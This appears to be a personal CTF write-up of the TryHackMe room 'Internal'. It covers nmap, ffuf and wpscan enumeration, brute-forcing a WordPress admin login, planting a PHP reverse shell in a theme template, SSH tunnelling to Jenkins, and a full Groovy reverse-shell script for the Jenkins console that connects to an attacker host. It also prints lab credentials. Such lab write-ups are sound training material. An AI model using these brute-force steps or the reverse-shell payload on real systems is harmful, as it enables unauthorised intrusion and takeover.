---
title: "Internal Writeup THM"
description: "My writeup of the TryHackMe room [Internal](https://tryhackme.com/room/internal)"
date: 2024-01-01T18:00:00+01:00
image: https://images.unsplash.com/photo-1495592822108-9e6261896da8?q=80&w=2670&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Windows
    - Privilege Escalation
    - Jenkins
    - Wordpress
categories:
    - Room
    - Hard
---

The first thing that I am going to do is a nmap scan:

```bash
sudo nmap -A 10.10.186.60

Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-31 14:46 EST
Nmap scan report for internal.thm (10.10.186.60)
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

I found 2 ports,

- 22(SSH)
- 80(HTTP)

The first thing that I am going to do is exploring the web page in port 80.

I get meeted by the Apache2 Ubuntu Default Page, so now I know that the server is running the ubuntu and Apache2.

But that’s all forn know, so I started a subdomain/subdirectory enumeration,

The directory that I have found are those:

```bash
ffuf -u http://10.10.186.60:80/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.186.60:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 5064ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 6097ms]
blog                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 58ms]
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 57ms]
phpmyadmin              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 341ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 59ms]
wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 57ms]
```

From there I can see that the server is powered by wordpress, and runs javascript.

So now I am just going to explore these subdirectories more…

So, for now I have:

- Apache 2.4.29
- Wordpress 5.4.2
- MySQL

They are old version, so maybe I can find something on the internet.

Also I have 2 login pages:

- http://internal.thm/blog/wp-login.php
- http://10.10.186.60/phpmyadmin/

Now I try to get some information directly trough wordpress, using wpscan:

```bash
wpscan --url 10.10.186.60/blog -e u vp
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.186.60/blog/ [10.10.186.60]
[+] Started: Sun Dec 31 15:10:27 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.186.60/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.186.60/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.186.60/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.186.60/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.186.60/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===================================================================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Dec 31 15:10:31 2023
[+] Requests Done: 48
[+] Cached Requests: 5
[+] Data Sent: 11.895 KB
[+] Data Received: 302.953 KB
[+] Memory used: 150.684 MB
[+] Elapsed time: 00:00:03
```

Here we can see that I have retrieved an username, Admin!

Now I can try to retrieve the password:

```bash
wpscan --url 10.10.186.60/blog -e u -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.186.60/blog/ [10.10.186.60]
[+] Started: Sun Dec 31 15:29:27 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.186.60/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.186.60/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.186.60/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.186.60/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.186.60/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==================================================================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys
Trying admin / princess7 Time: 00:04:06 <                                                                                                                                                                                              > (3885 / 14348276)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Dec 31 15:33:36 2023
[+] Requests Done: 3900
[+] Cached Requests: 40
[+] Data Sent: 2.001 MB
[+] Data Received: 2.3 MB
[+] Memory used: 190.441 MB
[+] Elapsed time: 00:04:09
```

Seems like it worked.

![Untitled](https://raw.githubusercontent.com/Blueaulo/Internal-writeup-THM/main/383e5267-e2e0-4d84-a69b-749bf9862c2d_Export-decaaa4d-2c6b-4d4a-b2e6-36c0415c2dd0/Internal%206e6f52af5eac4b2abbad67bc61a655b2/Untitled.png)

Here in the posts tab I can see that there is another post, but they haven’t published it, let’s see what there is into it:

![Untitled](https://raw.githubusercontent.com/Blueaulo/Internal-writeup-THM/main/383e5267-e2e0-4d84-a69b-749bf9862c2d_Export-decaaa4d-2c6b-4d4a-b2e6-36c0415c2dd0/Internal%206e6f52af5eac4b2abbad67bc61a655b2/Untitled%201.png)

Wow, now I have another se of credential:

william:arnold147

I am going to try to enter this in the ssh and phpmyadmin page.

They didn’t work.

Ok, now I am just going to get a reverse shell, from this point is pretty easy.

You just want to go to the Theme Editor, and access the 404 Template, from there you can remove the php code, and plant your php reverse shell:

![Untitled](https://raw.githubusercontent.com/Blueaulo/Internal-writeup-THM/main/383e5267-e2e0-4d84-a69b-749bf9862c2d_Export-decaaa4d-2c6b-4d4a-b2e6-36c0415c2dd0/Internal%206e6f52af5eac4b2abbad67bc61a655b2/Untitled%203.png)

From there I started my listener and got the reverse shell:

![Untitled](https://raw.githubusercontent.com/Blueaulo/Internal-writeup-THM/main/383e5267-e2e0-4d84-a69b-749bf9862c2d_Export-decaaa4d-2c6b-4d4a-b2e6-36c0415c2dd0/Internal%206e6f52af5eac4b2abbad67bc61a655b2/Untitled%204.png)

Now that I am in  I went to the opt folder and discovered these credentials:

```bash
meterpreter > cat wp-save.txt

Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

So I entered from ssh:

```bash
ssh aubreanna@10.10.186.60

aubreanna@10.10.186.60's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Dec 31 21:32:39 UTC 2023

  System load:  0.0               Processes:              114
  Usage of /:   63.8% of 8.79GB   Users logged in:        0
  Memory usage: 44%               IP address for eth0:    10.10.186.60
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
aubreanna@internal:~$
```

Here we can retrieve the user.txt flag, and we can also see that there is a jenkins server running in `172.17.0.2:8080`

So I made a ssh tunnel using:

```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.186.60
```

And from there we have a tunnel.

Now we can simply go to localhost:8080 and we are in the login page for jenkins.

From there I try to brute force the login page using ZAP.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/7fecbb84-9598-4ec2-9fa9-5ad99163bcf9/b9960a90-b48b-4c25-ac64-83f5d0a17ac0/Untitled.png)

As you can see I got a request much different from the others, often that means that we have what we want.

Now that we are into Jenkins we just need to go to the script console, and writing this:

```bash
Thread.start {
String host="<your_machine_IP>";
int port=<your_webserver_port>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
}
```

cmd.exe if is windows, /bin/bash if is linux.

And start the listener in our machine.

Now that we are inside the machine we can go into the opt folder again and take the root credentials:

```bash
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
need access to the root user account.

root:tr0ub13guM!@#123
```
